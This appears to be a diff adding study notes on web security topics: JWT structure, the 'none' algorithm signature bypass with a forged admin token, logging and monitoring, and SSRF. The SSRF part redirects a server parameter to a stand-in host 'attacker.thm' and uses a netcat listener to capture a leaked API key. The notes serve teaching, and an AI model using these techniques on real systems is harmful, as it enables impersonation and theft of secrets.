@@ -166,4 +166,79 @@ Modern browser allow to specify a hash along the library's URL to check the inte
 ## Data Integrity Failures
 Web application will usually assign session tokens to idetify the user and his behavior´. These session tokens usually take the form of [*cookies*](https://de.wikipedia.org/wiki/HTTP-Cookie). These cookies could contain the username of a user and in each subsequent request the cookie will be send to the server. Without integrity checks someone could change the username in the cookie, as they are stored in the browser, and impersonate another user. 
 One implementation of an integrity check is [*JSON Web Tokens (JWT)*](https://datatracker.ietf.org/doc/html/rfc7519). JWTs allow you to store key-value pairs on tokens, which provide integrity. These tokens ensure that users can not alter the key-value pair and pass the integrity check. 
-The structure of a JWT token consists of 3 parts:
+The structure of a JWT token consists of 3 parts, seperated by a `.`:
+- **Header**: contains metadata and the signing algorithm
+- **Payload**: contains the key-value pairs and data the application wants the client to store
+- **Signature**: similar to a hash used to check the payload's integrity
+
+The 3 parts are plaintext encoded with [*Base64*](https://de.wikipedia.org/wiki/Base64), which can be decoded with tools like [this](https://appdevtools.com/base64-encoder-decoder).
+Remember that the signature contains binary data, even decoded it will not make sense.
+**Example**
+```
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNjY1MDc2ODM2fQ.C8Z3gJ7wPgVLvEUonaieJWBJBYt5xOph2CpIhlxqdUw
+```
+
+| Part          | Encoded                                            | Decoded                                   |
+| ------------- | -------------------------------------------------- | ----------------------------------------- |
+| **Header**    | eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9               | {"typ":"JWT","alg":"HS256"}               |
+| **Payload**   | eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNjY1MDc2ODM2fQ | {"username":"guest",<br>"exp":1665076836} |
+| **Signature** | C8Z3gJ7wPgVLvEUonaieJWBJBYt5xOph2CpIhlxqdUw        | Æwð>K¼E(¨%`IyÄêaØ*H\juL          |
+### JWT and the None Algorithm
+A vulnerability was present on some libraries impelenting JWTs, which allowed attackers to bypass the signature validation by:
+- modifying the header section `alg` to the value `none`
+- removing the signature part
+
+**Example**
+```
+eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjY1MDc2ODM2fQ
+```
+
+| Part        | Encoded                                            | Decoded                                   |
+| ----------- | -------------------------------------------------- | ----------------------------------------- |
+| **Header**  | eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0                | {"typ":"JWT","alg":"none"}                |
+| **Payload** | eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjY1MDc2ODM2fQ | {"username":"admin",<br>"exp":1665076836} |
+## Exercise 
+
+# 9. Security Logging and Monitoring Failures
+Every action by a user inside a web application should be logged. This is important becuase when an attack occurs, the actvities of him can be traced and the impact can be determined. 
+Without logging there could be:
+- **Regulatory damage**: if the attacker gained access to personal data and there is no record, the users are affected and the application owner may be subject to fines or more severe regulations
+- **Risk of further attacks**: if the attacker and his actions are undected, this could allow the attacker to launch further attacks.
+
+Logs should include:
+- HTTP status codes
+- Time stamps
+- Usernames
+- API endpoints/page locations
+- IP addresses
+
+Logging is very important after an attack occured, as monitoring should be in place to detect and stop suspicious activities.
+Suspicious activities includes:
+- Multiple unauthorised attempts for particular actions, such as login attempts or access to unauthorised resouces (admin pages, etc.)
+- Requests from anomalous IP addresses or locations
+- Use of automated tools, which can be identified by the value of User-Agent headers or the speed of requests
+- Using common known payloads
+
+## Exercise
+# 10. Server-Side Request Forgery (SSRF)
+A basic example of *SSRF* would be when a web application exposes a server parameter, for example:
+```
+http://www.examplesite.com/sms?server=srv3.sms.thm&msg=hello
+```
+An attacker could change the value of the `server` to point to their own machine.
+```
+http://www.examplesite.com/sms?server=attacker.thm&msg=hello
+```
+The web application would than forward the server request to the attacker, who would optain the *API key*. The *API key* is a secret key used as an authentication token when a application uses a external API.
+
+To capture the content of the request you can use Netcat:
+```
+nc -lvp 80
+```
+
+*SSRF* can be used to:
+- Enumerate internal networks, including IP addresses and ports
+- Gain access to restricted services
+- Interact with non-HTTP services to get *Remote Code Execution (RCE)*
+
+## Exercise 
